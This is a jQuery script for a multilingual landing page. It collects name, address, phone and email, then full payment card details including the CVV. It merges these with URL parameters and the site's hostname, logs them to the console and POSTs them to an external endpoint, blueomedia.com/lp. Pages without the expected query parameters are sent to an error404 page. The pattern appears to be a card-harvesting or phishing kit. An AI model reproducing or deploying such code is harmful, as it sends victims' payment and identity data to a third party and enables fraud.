$(document).ready(function () {

    $(".menu-icon").on('click', function () {
        $(this).toggleClass("effect1");
        $('.header__list').toggleClass('menu-active');
    });

    $('#agree').on('click', function () {
        if ($(this).prop('checked')) {
            $('#btn-form-submit').prop('disabled', false);
        } else {
            $('#btn-form-submit').prop('disabled', true);
        }
    });

    $('input').on('focus', function () {
        $(this).addClass('inp-focus');
    });

    $('input').on('blur', function () {
        $(this).removeClass('inp-focus');
    });


    $('.form').validate({
        rules: {
            firstName: {
                required: true
            },
            lastName: {
                required: true
            },
            email: {
                required: true,
                email: true
            },
            phone: {
                required: true
            },
            city: {
                required: true
            },
            address: {
                required: true
            },
            zip: {
                required: true
            }
        },
        messages: {
            firstName: {
                required: "The First name field is required."
            },
            lastName: {
                required: 'The Last name field is required.'
            },
            email: {
                required: 'The Email field is required.'
            },
            phone: {
                required: 'The Phone field is required.'
            },
            city: {
                required: 'The City field is required.'
            },
            address: {
                required: 'The Address field is required.'
            },
            zip: {
                required: 'The ZIP field is required.'
            }
        },
        submitHandler: function () {
            $('.form').hide();
            $('.form-payment').show();
        }
    });

    $('.form-payment').validate({
        rules: {
            cartNumber: {
                required: true,
                minlength: 15,
                normalizer: function (value) {
                    value = value.replace(/\s+/g, '');
                    return $.trim(value);
                }
            },
            expirationDate: {
                required: true,
                minlength: 5
            },
            name: {
                required: true
            },
            cvv: {
                required: true,
                minlength: 3
            }
        },
        messages: {
            cartNumber: {
                required: "The Cart number field is required.",
                minlength: "The Cart number field must be at least 15 characters."
            },
            expirationDate: {
                required: 'The Expiration date field must be at least 4 characters.'
            },
            name: {
                required: 'The Name field is required.'
            },
            cvv: {
                required: 'The cvv field must be at least 3 characters.'
            }
        },
        submitHandler: function () {

            let formData = {};

            let urlData = window.location.search.replace('?', '').split('&').reduce(
                function (p, e) {

                    if (e !== '') {
                        var a = e.split('=');

                        if (a[0] !== '' && a[1] !== '') {
                            p[decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
                        } else {
                            window.location.href = 'error404.html';
                        }
                    } else {
                        window.location.href = 'error404.html';
                    }

                    return p;
                },
                {}
            );

            let hostname = window.location.hostname;
            let form = $('.form').serializeArray();
            let formPayment = $('.form-payment').serializeArray();

            for (let i = 0; i < form.length; i++) {
                formData[form[i].name] = form[i].value;
            }

            for (let i = 0; i < formPayment.length; i++) {
                formData[formPayment[i].name] = formPayment[i].value;
            }

            let sendData = Object.assign(urlData, formData);
            sendData.host = hostname;

            sendData.cartNumber = parseInt(sendData.cartNumber.replace(/\s+/g, ''));
            sendData.phone = parseInt(sendData.phone.replace(/\s+/g, '').match(/\d+/g).join(''));


            console.log('%c sendData', 'color: green; font-size: 16px; font-weight: 600;', sendData);

            $.ajax({
                // async: false,
                url: "https://blueomedia.com/lp",
                type: "POST",
                // dataType: "jsonp",
                contentType: "application/json",
                data: sendData,
                // headers: {'Access-Control-Allow-Origin': '*'},
                // cache: false,
                // crossDomain: true,
                beforeSend: function (status, obj) {
                    // console.log(status);
                    console.log('before send', obj);
                },
                success: function (data) {
                    console.log(data);
                    $('.form, .form-payment').trigger('reset');
                },
                error: function (err) {
                    console.log('error', err);
                    // window.location.href = 'error404.html';
                }
            });
        }
    });


    // === mask input
    $('[name="phone"]').mask("+380 (99) 999 99 99");


    // === cleave js
    var expirationDate = new Cleave('[name="expirationDate"]', {
        date: true,
        datePattern: ['m', 'y']
    });

    var cartNumber = new Cleave('[name="cartNumber"]', {
        creditCard: true,
        onCreditCardTypeChanged: function (type) {
            // console.log(type);
            if (type === 'unknown') {
                $('[name="cartType"]').val('');
                $('[name="cvv"]').attr({
                    maxlength: 3,
                    placeholder: '000',
                }).val('');
            } else if (type === 'amex') {
                $('[name="cartType"]').val(type);
                $('[name="cvv"]').attr({
                    maxlength: 4,
                    placeholder: '0000',
                }).val('');
            } else {
                $('[name="cartType"]').val(type);
                $('[name="cvv"]').attr({
                    maxlength: 3,
                    placeholder: '000',
                }).val('');
            }
        }
    });


    // === ВВОД ТОЛЬКО ЦИФР === //
    $('.only-number').bind("change keyup input click", function () {
        if ($(this).val().match(/[^0-9]/g)) {
            $(this).val($(this).val().replace(/[^0-9]/g, ''));
        }
    });


    // === MENU LANG === //
    $('.localization .active').on('click', function() {
        $('.localization .list').toggleClass('open');
    });

    $('.localization .list li').on('click', function() {
        let lang = $(this).find('.list__lang').attr('data-lang');
        localStorage.setItem('lang', lang);
        window.location.reload();
    });


    // === TRANSLATES === //
    var language = localStorage.getItem('lang') || 'pl';

    console.log(language);

    $('.localization .active').append('<img src="img/language/' + language + '.png" alt=""><span class="active__lang">' + language + '</span>');

    var option = document.querySelectorAll('.localization .list__lang');

    option.forEach(function (el) {
        if (language === $(el).attr('data-lang')) {
            $(el).parent().addClass('selected');
        }
    });

    /*$('#language').on('change', function () {
        console.log($(this).val());
        let lang = $(this).val();
        localStorage.setItem('lang', lang);
        window.location.reload();
    });*/

    $("[data-localize]").localize("translate", {
        pathPrefix: "./translates",
        language: language
    });

});